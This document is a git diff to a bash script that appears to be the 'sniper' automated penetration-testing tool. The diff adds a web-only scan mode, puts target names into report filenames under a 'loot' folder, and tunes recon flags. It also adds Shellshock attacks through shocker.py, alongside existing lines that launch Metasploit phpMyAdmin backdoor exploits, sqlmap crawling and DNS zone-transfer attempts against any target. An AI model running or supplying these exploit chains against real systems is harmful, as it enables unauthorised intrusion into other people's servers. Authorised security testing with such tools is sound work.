@@ -23,7 +23,7 @@
 # ./sniper <target> <report>
 # ./sniper <target> stealth <report>
 # ./sniper <target> port <portnum>
-# ./sniper <target> web
+# ./sniper <target> web <report>
 # ./sniper <target> nobrute <report>
 # ./sniper <targets.txt> airstrike <report>
 # ./sniper <targets.txt> nuke <report>
@@ -80,9 +80,16 @@ if [ "$MODE" = "report" ]; then
 	exit
 fi
 
+if [ "$MODE" = "web" ]; then
+	if [ "$OPT1" = "report" ]; then
+		./sniper $TARGET $MODE | tee ./loot/sniper-$TARGET-$MODE-`date +%Y%m%d%H%M`.txt 2>&1
+		exit
+	fi
+fi
+
 if [ "$MODE" = "stealth" ]; then
 	if [ "$OPT1" = "report" ]; then
-		./sniper $TARGET $MODE | tee ./loot/sniper-$MODE-`date +%Y%m%d%H%M`.txt 2>&1
+		./sniper $TARGET $MODE | tee ./loot/sniper-$TARGET-$MODE-`date +%Y%m%d%H%M`.txt 2>&1
 		exit
 	fi
 	echo -e "$OKRED                ____               $RESET"
@@ -132,13 +139,13 @@ if [ "$MODE" = "stealth" ]; then
 	then
 		dig -x $TARGET
 		whois $TARGET
-		theharvester -d $TARGET -l 200 -b all -v -n -t 2> /dev/null
+		theharvester -d $TARGET -l 200 -b all -v -t 2> /dev/null
 		dnsrecon -d $TARGET
 		dnsrecon -d $TARGET -t zonewalk
 		dnsrecon -d $TARGET -t axfr
 		dnsenum $TARGET -f BruteX/wordlists/namelist.txt
 		mv -f *_ips.txt loot/ 2>/dev/null
-		python Sublist3r/sublist3r.py -d $TARGET -b -t 30 2>/dev/null
+		python Sublist3r/sublist3r.py -d $TARGET -vvv 2>/dev/null
 	fi
 	echo ""
 	echo -e "$OKGREEN################################### Running passive scans #########################$RESET"
@@ -153,7 +160,7 @@ fi
 
 if [ "$MODE" = "airstrike" ]; then
 	if [ "$OPT1" = "report" ]; then
-		./sniper $TARGET $MODE | tee ./loot/sniper-$MODE-`date +%Y%m%d%H%M`.txt 2>&1
+		./sniper $TARGET $MODE | tee ./loot/sniper-$TARGET-$MODE-`date +%Y%m%d%H%M`.txt 2>&1
 		exit
 	fi
 	echo -e "$OKRED                ____               $RESET"
@@ -199,13 +206,13 @@ if [ "$MODE" = "airstrike" ]; then
 		then
 			dig -x $a
 			whois $a
-			theharvester -d $TARGET -l 200 -b all -v -n -t 2> /dev/null
+			theharvester -d $TARGET -l 200 -b all -v -t 2> /dev/null
 			dnsrecon -d $a
 			dnsrecon -d $a -t zonewalk
 			dnsrecon -d $a -t axfr
 			dnsenum $a -f BruteX/wordlists/namelist.txt
 			mv -f *_ips.txt loot/ 2>/dev/null
-			python Sublist3r/sublist3r.py -d $TARGET -b -t 30 2>/dev/null
+			python Sublist3r/sublist3r.py -d $TARGET -vvv 2>/dev/null
 		fi
 		echo ""
 		echo -e "$OKGREEN################################### Running passive scans #########################$RESET"
@@ -238,7 +245,7 @@ fi
 
 if [ "$MODE" = "nuke" ]; then
 	if [ "$OPT1" = "report" ]; then
-		./sniper $TARGET $MODE | tee ./loot/sniper-$MODE-`date +%Y%m%d%H%M`.txt 2>&1
+		./sniper $TARGET $MODE | tee ./loot/sniper-$TARGET-$MODE-`date +%Y%m%d%H%M`.txt 2>&1
 		exit
 	fi
 	for a in `cat $TARGET`; do
@@ -278,13 +285,13 @@ if [ $SCAN_TYPE == "DOMAIN" ];
 then
 	dig -x $TARGET
 	whois $TARGET
-	theharvester -d $TARGET -l 200 -b all -v -n -t 2> /dev/null
+	theharvester -d $TARGET -l 200 -b all -v -t 2> /dev/null
 	dnsrecon -d $TARGET
 	dnsrecon -d $TARGET -t zonewalk
 	dnsrecon -d $TARGET -t axfr
 	dnsenum $TARGET -f BruteX/wordlists/namelist.txt
 	mv -f *_ips.txt loot/ 2>/dev/null
-	python Sublist3r/sublist3r.py -d $TARGET -b -t 30 2>/dev/null
+	python Sublist3r/sublist3r.py -d $TARGET -vvv 2>/dev/null
 fi
 echo ""
 echo -e "$OKGREEN################################### Pinging host ###################################$RESET"
@@ -294,6 +301,8 @@ echo -e "$OKGREEN################################### Running port scan #########
 if [ -z "$OPT1" ]; then
 	nmap -sS -sV -T4 -A -O -p 1-65535 --open $TARGET -oX $LOOT_DIR/nmap-$TARGET.xml
 	nmap -sU -sV -T4 -A -O -p U:53,U:67,U:68,U:88,U:161,U:162,U:137,U:138,U:139,U:389,U:520,U:2049 --open $TARGET
+elif [ "$OPT1" == "web" ]; then
+	nmap -sS -sV -T4 -A -O -p 80,443 --open $TARGET -oX $LOOT_DIR/nmap-web-$TARGET.xml
 else
 	nmap -sS -sV -T4 -A -O -p $OPT1 --open $TARGET -oX $LOOT_DIR/nmap-$TARGET.xml
 	nmap -sU -sV -T4 -A -O -p U:$OPT1 --open $TARGET
@@ -477,6 +486,7 @@ else
 		arachni http://$TARGET --output-only-positives
 		sqlmap -u "http://$TARGET" --batch --crawl=5 --level 1 --risk 1 -f -a
 		msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
+		python shocker/shocker.py -H $TARGET --cgilist shocker/shocker-cgi_list --port 80
 	fi
 fi
 
@@ -619,6 +629,7 @@ else
 		arachni https://$TARGET --output-only-positives
 		sqlmap -u "https://$TARGET" --batch --crawl=5 --level 1 --risk 1 -f -a
 		msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 443; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
+		python shocker/shocker.py -H $TARGET --cgilist shocker/shocker-cgi_list --port 443 --ssl
 	fi
 fi
 
